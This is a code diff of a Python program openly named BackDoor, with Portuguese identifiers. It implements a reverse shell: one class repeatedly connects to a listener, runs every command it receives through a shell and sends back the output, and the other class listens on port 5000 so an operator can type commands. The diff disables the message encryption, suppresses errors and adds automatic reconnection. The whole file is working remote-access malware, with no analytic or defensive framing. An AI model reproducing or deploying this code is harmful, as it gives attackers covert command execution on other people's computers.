@@ -1,30 +1,38 @@
-from os import strerror
 from datetime import datetime
 from subprocess import Popen, PIPE
+from base64 import urlsafe_b64encode
 from cryptography.fernet import Fernet
+from cryptography.hazmat.primitives import hashes
+from cryptography.hazmat.backends import default_backend
+from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
 from socket import socket, AF_INET, SOCK_STREAM, SOL_SOCKET, SO_REUSEADDR
+
 
 class BackDoorSRV:
     def __init__(self, host, port=5000):
         self.print(f"INICIANDO CONEXAO COM {host}:{port}")
-        self.conexao = socket(AF_INET, SOCK_STREAM)
-        self.conexao.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
-        self.conexao.settimeout(20)
         self.buffer = 1024
         self.encriptarMsg()
         self.host = host
         self.port = port
         self.run()
 
+    def criarConexao(self):
+        self.conexao = socket(AF_INET, SOCK_STREAM)
+        self.conexao.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
+        #self.conexao.settimeout(20)
+
     def run(self):
         contagem = 0
         while True:
             try:
+                self.criarConexao()
                 print(f"TENTANDO CONECTAR({contagem})", end='\r')
                 contagem += 1
                 self.conexao.connect((self.host, self.port))
+                contagem = 0
                 self.receberConexao()
-            except: self.conexao.close()
+            except Exception as erro: self.conexao.close()
 
     def receberConexao(self):
         self.send(self.conexao, f"VOCÊ ESTA CONECTADO!\n")
@@ -41,57 +49,68 @@ class BackDoorSRV:
                             self.conexao.close(); break 
                         self.cmds(cmd, self.conexao)
                         self.print(cmd)
-                    con.send(f"CMD({datetime.now()}) > ".encode('UTF-8'))
-                except Exception as erro: self.fecharConexao(self.conexao, erro); break
-            except Exception as erro: self.fecharConexao(self.conexao, erro); break
+                    self.send(self.conexao, f"CMD({datetime.now()}) > ")
+                except Exception as erro: pass#self.fecharConexao(self.conexao, erro); break
+            except Exception as erro: pass#self.fecharConexao(self.conexao, erro); break
 
     def fecharConexao(self, con, err):
-        print(f"ERRO ENCONTRADO NA CONEXAO {con} ---> {err}")
+        print(f"ERRO ENCONTRADO NA CONEXAO {con} ---> ({err})")
+        print("FECHANDO A CONEXAO")
         try: con.close()
         except: pass
 
     def cmds(self, cmd, cliente):
-        cliente.send(Popen(cmd.replace('\n', ''), shell=True, stdout=PIPE, stdin=PIPE).stdout.read())
+        cmds = Popen(cmd.replace('\n', ''), shell=True, stdout=PIPE, stdin=PIPE).stdout.read()
+        self.conexao.sendall(cmds)
 
     def print(self, msg, log=True):
-        print(msg)
         if(log): self.gravarLog(msg.replace('\n', ''))
 
     def encriptarMsg(self):
-        objKey = Fernet.generate_key()
+        salt = b'JESUS ESTA VOLTANDO EM BREVE' 
+        kdf = PBKDF2HMAC( algorithm=hashes.SHA256(), length=32, salt=salt, iterations=100000, backend=default_backend())
+        objKey = urlsafe_b64encode(kdf.derive(salt))
         self.objEncryptor = Fernet(objKey)
 
     def send(self, con, msg):
-        con.send(self.objEncryptor.encrypt(msg.encode('UTF-8')))
+        #con.send(self.objEncryptor.encrypt(msg.encode('UTF-8')))
+        con.send(msg.encode('UTF-8'))
 
-    def recv(self, con):        
-        return self.objEncryptor.decrypt(con.recv(self.buffer))
+    def recv(self, con):
+        return con.recv(self.buffer)
+        """
+        msg = con.recv(self.buffer)
+        try: return self.objEncryptor.decrypt(msg).decode()
+        except: return msg
+        """
 
     def gravarLog(self, msg):
         with open('log.log', 'a') as arq: arq.write(f'{datetime.now()} ---- ' + msg + '\n')
 
 class BackDoorCli(BackDoorSRV):
-    def __init__(self, srv, port):
-        self.print(f"INICIANDO CONEXAO {srv}: {port}")
-        self.conexao = srv
+    def __init__(self, port):
+        self.print(f"ABRINDO CONEXAO PORTA: {port}")
+        print("[!!!] PRONTO PARA OPERAR COMANDANTE!\n")
         self.port = port
-        try:
-            self.conexao = socket(AF_INET, SOCK_STREAM)
-            self.conexao.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
-            self.encriptarMsg()
-            self.buffer = 1024
-            self.run()
-        except Exception as erro: input(f'COMPUTADOR {self.conexao}:{self.port} NÃO ESTA ACESSIVEL: {erro}')
+        self.criarConexao()
+        self.conexao.bind(('', port))
+        self.conexao.listen(1)
+        self.encriptarMsg()
+        self.buffer = 1024
+        self.run()
 
     def run(self): 
-        self.conexao.connect((self.conexao, self.port))
-        print("[!!!] PRONTO PARA OPERAR COMANDANTE!\n")
         while True:
             try:
-                print(self.recv(self.conexao))
-                cmd = input("DIGITE O COMANDO DO DOS E PRESSIONE [ENTER]>:")
-                self.send(self.conexao, cmd)
-            except: pass
+                con, cli = self.conexao.accept()
+                print(f"SERVIDOR CONECTADO {cli}")
+                while True:
+                    try:
+                        print(self.recv(con))
+                        cmd = input("DIGITE O COMANDO DO DOS E PRESSIONE [ENTER]>:")
+                        self.send(con, cmd)
+                    except  Exception as erro: self.fecharConexao(con, erro);break
+            except Exception as erro: self.fecharConexao(con, erro)
 
-BackDoorSRV('127.0.0.1', 5000)
-#BackDoorCli('127.0.0.1', 5000)
+#BackDoorSRV('127.0.0.1', 5000)
+BackDoorCli(5000)
